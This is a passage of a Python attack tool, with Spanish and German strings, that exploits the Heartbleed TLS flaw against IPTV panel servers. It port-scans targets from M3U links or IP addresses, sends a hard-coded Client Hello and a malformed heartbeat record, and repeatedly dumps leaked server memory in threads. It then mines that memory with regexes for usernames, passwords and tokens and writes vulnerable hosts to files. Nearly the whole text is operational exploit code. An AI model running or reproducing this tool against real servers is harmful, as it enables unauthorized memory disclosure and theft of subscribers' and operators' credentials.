        cadena="\033[1;33m\n✮ Versuche Kunde: \033[1;92m"+str(id(self))+"\033[1;33m\n✮ Container ID: \033[1;92m"+str(id(self.miDataContainer))+"\033[1;33m\n✮ Combo Container ID: \033[1;92m"+str(id(self.contenedorUSER_PASS))+"\033[0m"
        print(cadena)
        while(True):
            user = ""
            passw = ""
            datos=self.miDataContainer.get()
            resultado = re.findall(self.patronLISTACANAL_M3U, datos)

            if (len(resultado) > 0):  
                if (debug):
                    cadena = Fore.GREEN + "Liste Kanalinfos aus M3U => " + datos + Fore.RESET
                    self.writeDebugCode(cadena+"\n\t"+datos)
                for elemento in resultado:
                    user, passw = self.extractData_LISTACANAL_m3u(elemento)
                    self.tratarUsuario(user, passw)
            resultado=re.findall(self.patronURL_USERNAME_PASSWORD, datos)
            if (len(resultado)>0):
                if (debug):
                    cadena=Fore.GREEN+"Liste USER:PASS aus M3U => "+datos+Fore.RESET
                    self.writeDebugCode(cadena+"\n\t"+datos)
                for elemento in resultado:
                    user, passw = self.extractData_URL_USERNAME_PASSWORD(elemento)
                    self.tratarUsuario(user,passw)
            resultado=re.search(self.patronEXTINF,datos)
            if (resultado!=None):
                if (debug):
                    cadena = Fore.GREEN + "LESE EXTINF => " + datos + Fore.RESET
                    self.writeDebugCode(cadena+"\n\t"+datos)
                for elemento in resultado:
                    user, passw = self.extractDataRequestEXTINF(elemento)
                    self.tratarUsuario(user, passw)
            resultado=re.findall(self.patronREQUEST_URI,datos)
            if (len(resultado) > 0): 
                if (debug):
                    cadena = Fore.GREEN + "LESE REQUEST_URI => " + datos + Fore.RESET
                    self.writeDebugCode(cadena+"\n\t"+datos)
                for elemento in resultado:
                    user, passw = self.extractDataREQUEST_URI(elemento)
                    self.tratarUsuario(user, passw)
            resultado=re.findall(self.patronTOKEN,datos)
            if (len(resultado) > 0): 
                for elemento in resultado:
                    user, passw = self.extractDataRequestTOKEN(elemento)
                    self.tratarUsuario(user, passw)
                if (debug):
                    cadena = Fore.GREEN + "LESE BOSS TOKEN => " + datos + Fore.RESET
                    self.writeDebugCode(cadena+"\n\t"+datos)
            resultado = re.findall(self.patronLIVE, datos)
            if (len(resultado) > 0): 
                for elemento in resultado:
                    user, passw = self.extractDataRequestLIVE(elemento)
                    self.tratarUsuario(user, passw)
                if (debug):
                    cadena = Fore.GREEN + "LESE DIE KATEGORIEN LIVE => " + datos + Fore.RESET
                    self.writeDebugCode(cadena+"\n\t"+datos)

class DataOutputGenerator:
    False

class PanelAttack_SSL:
    miProductor:DataContainer    
    hello = ''' 
            16 03 02 00  dc 01 00 00 d8 03 02 53
            43 5b 90 9d 9b 72 0b bc  0c bc 2b 92 a8 48 97 cf
            bd 39 04 cc 16 0a 85 03  90 9f 77 04 33 d4 de 00
            00 66 c0 14 c0 0a c0 22  c0 21 00 39 00 38 00 88
            00 87 c0 0f c0 05 00 35  00 84 c0 12 c0 08 c0 1c
            c0 1b 00 16 00 13 c0 0d  c0 03 00 0a c0 13 c0 09
            c0 1f c0 1e 00 33 00 32  00 9a 00 99 00 45 00 44
            c0 0e c0 04 00 2f 00 96  00 41 c0 11 c0 07 c0 0c
            c0 02 00 05 00 04 00 15  00 12 00 09 00 14 00 11
            00 08 00 06 00 03 00 ff  01 00 00 49 00 0b 00 04
            03 00 01 02 00 0a 00 34  00 32 00 0e 00 0d 00 19
            00 0b 00 0c 00 18 00 09  00 0a 00 16 00 17 00 08
            00 06 00 07 00 14 00 15  00 04 00 05 00 12 00 13
            00 01 00 02 00 03 00 0f  00 10 00 11 00 23 00 00
            00 0f 00 01 01                                  
            '''
    hb = ''' 
            18 03 02 00 03
            01 40 00
            '''
    miOutputFileWriter:OutputFileWriter
    puertoINICIO_SCAN=_puertoINICIO_SCAN
    puertoFIN_SCAN=_puertoFIN_SCAN
    primeraVEZ_VULNERABLES=True

    def setDataContainer(self,_dataC:DataContainer):
        self.miProductor=_dataC

    def decoceStringToHEX(self,entrada):
        return decode_hex(entrada.replace(' ', '').replace('\n', ''))[0]

    def hexdump(self, s):        
        for b in range(0, len(s), 16):
            lin = [c for c in s[b: b + 16]]
            hxdat = ' '.join('%02X' % c for c in lin)
            pdat = ''.join(chr(c) if 32 <= c <= 126 else '' for c in lin)
            
    def recvall(self,s, length, timeout=5):
        endtime = time.time() + timeout
        rdata = b''
        try:
            remain = length
            while remain > 0:
                rtime = endtime - time.time()
                if rtime < 0:
                    return None
                r, w, e = select.select([s], [], [], 5)
                if s in r:
                    data = s.recv(remain)                    
                    if not data:
                        return None
                    rdata += data
                    remain -= len(data)
            return rdata
        except Exception as errp:            
            return None

    def recvmsg(self, s):
        hdr = self.recvall(s, 5)
        if hdr is None:
            return None, None, None
        typ, ver, ln = struct.unpack('>BHH', hdr)
        pay = self.recvall(s, ln, 10)
        if pay is None:
            return None, None, None        
        return typ, ver, pay

    def hit_hb(self,s):
        data=self.decoceStringToHEX(self.hb)
        s.send(data)
        while True:
            typ, ver, pay = self.recvmsg(s)
            if typ is None:
                print('\t\tKeine HB-Antwort erhalten, Server wahrscheinlich nicht anfällig')
                return False
            if typ == 24:
                print('\t\tHB-Antwort erhalten:')
                self.hexdump(pay)
                if len(pay) > 3:
                    print('\t\tServer ist anfällig!')
                else:
                    print('\t\tServer hat fehlerhafte Daten-Hallo- verarbeitet, hat aber keine zusätzlichen Daten zurückgegeben.')
                return True
            if typ == 21:
                print('Erhaltener Alarm:')
                self.hexdump(pay)
                print('Server hat einen Fehler zurückgegeben, wahrscheinlich nicht anfällig')
                return False

    def do_hb_new(self, s):
        while True:
            cadena=Fore.WHITE+"Daten vom Server lesen"+Fore.GREEN+str(s.getpeername())+Fore.RESET            
            typ, ver, pay = self.recvmsg(s)
            if typ is None:
                if debug:
                    print ("do_hb_new => Keine Herzschlag-Antwort erhalten, Server wahrscheinlich nicht anfällig")
                return False

            if typ == 24:
                
                if len(pay) > 3:
                    pdat = "".join((chr(c) if ((32 <= c <= 126) or (c == 10) or (c == 13)) else "") for c in pay)
                    if (debug):
                        self.miOutputFileWriter.writeToFile(pdat)
                    if len(pdat) > 50:  
                        self.miProductor.put(pdat)
                else:
                    print('Server hat fehlerhaftes HB verarbeitet, hat aber keine zusätzlichen Daten zurückgegeben.')
                return True
            if typ == 21:
                if debug:
                    print ('do_hb_new => Erhaltener Alarm:')
                self.hexdumpText(pay)

    
    def checkHB(self,_url, port:int, _socket:socket):         
        _socket.connect((_url, port))
        print('\t\tSending Client Hello...')
        sys.stdout.flush()
        _socket.send(self.decoceStringToHEX(self.hello))
        print('\t\tWaiting for Server Hello...')
        sys.stdout.flush()
        _continue = True
        while _continue:
            typ, ver, pay = self.recvmsg(_socket)
            if (typ!=None):
                time.sleep(1)
                if typ == 22 and pay[0] == 0x0E:                    
                    sys.stdout.flush()
                    data = self.decoceStringToHEX(self.hb)
                    _socket.send(data)
                    if (self.hit_hb(_socket)):
                        return True
            else:
                print('\t\tServer hat die Verbindung geschlossen, ohne Server Hello zu senden.')
                _continue = False
                

    def extractPort(self,url,_scaneoLento):
        print(logopic)
        print("Iniciar búsqueda de puerto =>"+Fore.WHITE,url,Fore.RESET)
        miPortScanner=PortScanner()
        url=url.replace("/","")
        listapuertos = miPortScanner.port_scan(url,range(self.puertoINICIO_SCAN,self.puertoFIN_SCAN),_scaneoLento)
        return listapuertos
    
    def checkServerStatus(self,simpleServer):
        estado, url, port,protocolo = checkFullM3U_URL(simpleServer, requests.session())
        return estado, url,port,protocolo
    
    def iniciarHilos(self,url,_listaservers,_listapuertos,puertoBase,protocolo,_miDS:DatosServerM3U,_dataContainer:DataContainer,_dictCombos):
        
        self.setDataContainer(_dataContainer)
        miCosumidor = DataAnalyzer()
        miCosumidor.setDataContainer(_dataContainer)
        miCosumidor.setCombosCotainer(_dictCombos)
        datosServidor = urlparse(url) 
        miCosumidor.setURLBase(_miDS)
        diccionarioAnterior=miCosumidor.readComboFromFile(_dictCombos)

        for total in range(totalHilosProductores):
            hiloextractor = threading.Thread(name='Extractor-'+str(total) ,target=self.doSimpleAtaque, args=(url, _listapuertos,_miDS))
            hiloextractor.start()
        for number in range(totalHilosConsumidores):
            hiloConsumidor = threading.Thread(name='Consumer-'+str(number),target=miCosumidor.doAnalyze)
            hiloConsumidor.start()

    
    def escribirDatosServerVulnerable(self,datos):
        f = open("servidoresvulnerables.txt", "a")
        if self.primeraVEZ_VULNERABLES:
            f.write("--------------------"+time.asctime()+"-----------------------\n")
            self.primeraVEZ_VULNERABLES=False
        try:
            f.write(datos)
            f.write("\n")
            f.close()
        except Exception as errp:
            print("Error writing to file:",errp)

    
    def pasoUNO(self,_url):
        miDS=DatosServerM3U()
        miDS.extraerServerFinal(_url)
        print(miDS)
        return miDS
    def iniciarMultiServer(self,url, simpleServer, simplePort, puertoBaseURL, protocolo, miDS:DatosServerM3U):
        miDataContainer = DataContainer()
        miDictCombos=dict()
        for server in miDS.host:
            miDSAUX=copy.copy(miDS)
            miDSAUX.host=server
            self.miOutputFileWriter = OutputFileWriter()  
            self.miOutputFileWriter.initValues(miDS.panelHost + ":" + str(puertoBaseURL))  
            self.iniciarHilos(url, simpleServer, simplePort, puertoBaseURL, protocolo, miDSAUX,miDataContainer,miDictCombos)


    
    def startAttack(self,_listaserver:str,_listapuertosEntrada):
        def save_results_to_file(m3u, remote_server, open_ports):
            if os.name == 'nt':
                file_path = './ipinfo/IP-PORTAL-PORTS.txt'
            else:
                file_path = '/sdcard/ipinfo/IP-PORTAL-PORTS.txt'

            os.makedirs(os.path.dirname(file_path), exist_ok=True)

            parsed_url = urlparse(m3u)
            m3u = parsed_url.scheme + "://" + parsed_url.netloc

            entry = f'Portal: {m3u}\nDUMP-IP: {remote_server}\nOffene Ports:\n{str(open_ports)}\n\n'

            if not os.path.isfile(file_path):
                with open(file_path, 'w'): pass

            with open(file_path, 'r') as file:
                if entry in file.read():
                    return

            with open(file_path, 'a') as file:
                file.write(entry)
        s = socket(AF_INET, SOCK_STREAM)
        print('Conectando...')
        estado = ""
        puertoBaseURL=""
        protocolo=""
        estado=""
        url=""
        serversAtacables=dict() 
        esSolo_Server_conIP=False
        miDS:DatosServerM3U
        scaneoLento = 1
        try:
            if len(_listapuertosEntrada)<=0:
                scaneoLento = int(input("Elija Su Velocidad De Escaneo!\n\n    0 => Lento\n    1 => Rápido\n\nSeleccìon => "))
                print(logopic)
                print(Fore.YELLOW+"Espera Un Momento...!!!\n"+Fore.RESET)
        except:
            scaneoLento = 1

        for simpleServer in _listaserver:
            url=""        
            if not simpleServer.find("m3u") == -1:  
                miDS=self.pasoUNO(simpleServer)
                print("Remote-Server gefunden => "+miDS.host)
                print(Fore.YELLOW +"\nRecuerde que si ingresa varios servidores de ataque, el puerto de ataque debe haberse ingresado antes y debe ser único!\n",Fore.RESET)                
                respueta=""                
                estado="OK"
                estado, url,puertoBaseURL,protocolo = self.checkServerStatus(simpleServer)
                if (miDS.host==""):
                    print(Fore.RED,"M3U URL ist nicht gültig, kann den echten m3u SERVER nicht validieren, greife DNS IP an",Fore.RESET)
                    resultadoParser=urlparse(simpleServer)
                    estado="OK"
                    url=resultadoParser.hostname
                    if resultadoParser.port!="":
                        puertoBaseURL=resultadoParser.port
                    protocolo=resultadoParser.scheme
            else: 
                miDS = self.pasoUNO(simpleServer)
                esSolo_Server_conIP = True
                resultadoParser=urlparse(simpleServer)
                url = resultadoParser.hostname
                if url==None:
                    url=resultadoParser.path
                if resultadoParser.port != None:
                    puertoBaseURL = resultadoParser.port
                if resultadoParser.scheme=="":
                    protocolo="http"
                else:
                    protocolo = resultadoParser.scheme
                estado = "OK"
            estado = "OK"
            temporalScanPuerto={}            
            if not (estado == "KO"):
                scaneoLento=1
                if len(_listapuertosEntrada) == 0: 
                    port_to_scan = self.extractPort(miDS.host,scaneoLento)
                    temporalScanPuerto=port_to_scan
                else:
                    port_to_scan=_listapuertosEntrada
                print("Ports gefunden für :",url," => ",port_to_scan)
                save_results_to_file(simpleServer, miDS.host, port_to_scan)
                if len(port_to_scan)>0:
                    for simplePort in port_to_scan:                        
                        try:
                            if (self.checkHB(miDS.host, simplePort, s)):                               
                                print("Vulnerable Port to use:", simplePort)
                                if True:
                                    miDataContainer=DataContainer()
                                    miDictCombos=dict()
                                    self.miOutputFileWriter = OutputFileWriter()  
                                    self.miOutputFileWriter.initValues(miDS.panelHost + ":" + str(puertoBaseURL))
                                    self.iniciarHilos(url, simpleServer, simplePort, puertoBaseURL, protocolo,miDS,miDataContainer,miDictCombos)
                                else:
                                    self.escribirDatosServerVulnerable(simpleServer+":"+str(simplePort))
                                    serversAtacables[simpleServer]=simplePort
                                break
                            else:
                                try:
                                    s.close()
                                    s = socket(AF_INET, SOCK_STREAM)
                                except Exception as errp:
                                    print("Fehler beim schließen des socket:",errp)
                        except Exception as errp:
                            s.close()
                            s = socket(AF_INET, SOCK_STREAM)
                            print("\t\tFehler:", errp)
                else:
                    print("Server :",url," keine Ports gefunden")
        print("attackable servers:",serversAtacables)

    def doSimpleAtaque(self, url:str, simplePort,_miDS:DatosServerM3U):
        cadena=Fore.WHITE+"Starte Angriff auf: "+_miDS.m3uURL+" gegen den Server:"+Fore.YELLOW+_miDS.host+Fore.RESET+"\n"        
        while True:
            try:
                servidor=url
                if _miDS.host!="": 
                    servidor=_miDS.host
                s = socket(AF_INET, SOCK_STREAM)
                s.connect((servidor, simplePort))
                s.send(self.decoceStringToHEX(self.hello))
                while True:
                    typ, ver, pay = self.recvmsg(s)
                    if typ == None:
                        if (debug):
                            print ('Server schloss die verbindung Ohne Hallo zu senden.')
                        return
                    
                    if typ == 22 and (pay[0]) == 0x0E:
                        break
                i = 0
                while os.path.exists("dump_%s.bin" % i):
                    i += 1;
                s.send(self.decoceStringToHEX(self.hb))
                while self.do_hb_new(s):
                    continue
            except Exception as errp:
                if (debug):
                    print("Fehler bei Verbindung versuche es weiter:",errp)

portal_url = ""
urlBASE = ""
def inciar(listaserver,listapuertos):
    global portal_url, urlBASE 
    cadena=Fore.BLACK+Back.GREEN+"Version:"+str(version)+Fore.RESET+Back.RESET
    print(cadena)
    cadena = Fore.BLACK + Back.YELLOW + "Version API:" + str(version) + Fore.RESET + Back.RESET
    if (len(listaserver))==0:
        print("\033[1;32m┌───────────────────────┐\033[0m")  # Grüner fetter Rahmen
        print("\033[1;32m│ \033[1;33mIngrese una Lista \033[1;32m    │\033[0m")  # Gelbe fette Schrift
        print("\033[1;32m│ \033[1;33mM3U-Valida     \033[1;32m       │\033[0m")  # Gelbe fette Schrift
        print("\033[1;32m│ \033[1;33mIngrese Dirección-IP?\033[1;32m │\033[0m")  # Gelbe fette Schrift
        print("\033[1;32m│ \033[1;33m1 => M3U-Link \033[1;32m        │\033[0m")  # Gelbe fette Schrift
        print("\033[1;32m│ \033[1;33m2 => IP-Adresse\033[1;32m       │\033[0m")  # Gelbe fette Schrift
        print("\033[1;32m└───────────────────────┘\033[0m")  # Grüner fetter Rahmen
        Selección  = input("\033[32mSelección  => "+Fore.YELLOW)
        if Selección  == "1":
            print("\033[1;32m┌───────────────────────┐\033[0m")  # Grüner fetter Rahmen
            print("\033[1;32m│ \033[1;33mIngrese Lista M3U-Link\033[1;32m│\033[0m")  # Gelbe fette Schrift
            print("\033[1;32m│ \033[1;33m  \033[1;32m                    │\033[0m")  # Gelbe fette Schrift
            print("\033[1;32m└───────────────────────┘\033[0m")  # Grüner fetter Rahmen
            listaserver=list(map(str,input("\033[32mM3U-Link => \033[33m").split()))        
        elif Selección  == "2":
            print("\033[1;32m┌───────────────────────┐\033[0m")  # Grüner fetter Rahmen
            print("\033[1;32m│ \033[1;33mTrage deine IP\033[1;32m        │\033[0m")  # Gelbe fette Schrift
            print("\033[1;32m│ \033[1;33mein!     \033[1;32m             │\033[0m")  # Gelbe fette Schrift
            print("\033[1;32m└───────────────────────┘\033[0m")  # Grüner fetter Rahmen
            listaserver=list(map(str,input("\033[32mIP-Adresse => \033[33m").split()))

            print("\033[1;32m┌───────────────────────┐\033[0m")  # Grüner fetter Rahmen
            print("\033[1;32m│\033[1;33m Bitte geben Sie die \033[1;32m  │\033[0m")  # Gelbe fette Schrift
            print("\033[1;32m│ \033[1;33mPortal-URL ein:     \033[1;32m  │\033[0m")  # Gelbe fette Schrift
            print("\033[1;32m└───────────────────────┘\033[0m")  # Grüner fetter Rahmen
            portal_url = input("\033[32mPortal mit Port => \033[33m")
        else:
            print("Ungültige Selección . Bitte versuche es erneut.")
            return inciar(listaserver, listapuertos)
        print("\033[1;32m┌───────────────────────┐\033[0m")  # Grüner fetter Rahmen
        print("\033[1;32m│\033[1;33m Ingrese       \033[1;32m        │\033[0m")  # Gelbe fette Schrift
        print("\033[1;32m│\033[1;33m Lista de Puertos o\033[1;32m    │\033[0m")  # Gelbe fette Schrift
        print("\033[1;32m│ \033[1;33mPresione Enter\033[1;32m        │\033[0m")  # Gelbe fette Schrift
        print("\033[1;32m└───────────────────────┘\033[0m")  # Grüner fetter Rahmen
        listapuertos = list(map(int, input("\033[32mOpcion => \033[33m").split()))
    if len(listaserver)==0:
        print(Fore.RED,"Falsche Parameter. Überprüfen Sie die Eingabedaten")
        quit()
    miPanelAttack_SSL = PanelAttack_SSL()
    miPanelAttack_SSL.startAttack(listaserver, listapuertos)

crearDirectoriosBase()
print(logopic)
scanPORTTYPE="WEB"
print("\033[1;32m┌────────────────────────┐\033[0m")  # Grüner fetter Rahmen
print("\033[1;32m│ \033[1;33mComo Buscar Puertos   ?\033[1;32m│\033[0m")  # Gelbe fette Schrift
print("\033[1;32m│ \033[1;33m0 => LOCAL \033[1;32m            │\033[0m")  # Gelbe fette Schrift
print("\033[1;32m│ \033[1;33m1 => WEB \033[1;32m              │\033[0m")  # Gelbe fette Schrift
print("\033[1;32m└────────────────────────┘\033[0m")  # Grüner fetter Rahmen
try:
    tipo=int(input("\033[32mOpcion => "))
    print(logopic)
    if (tipo!="") and (int(tipo)==1):
        scanPORTTYPE="WEB"
except:
    False
inciar({},{})
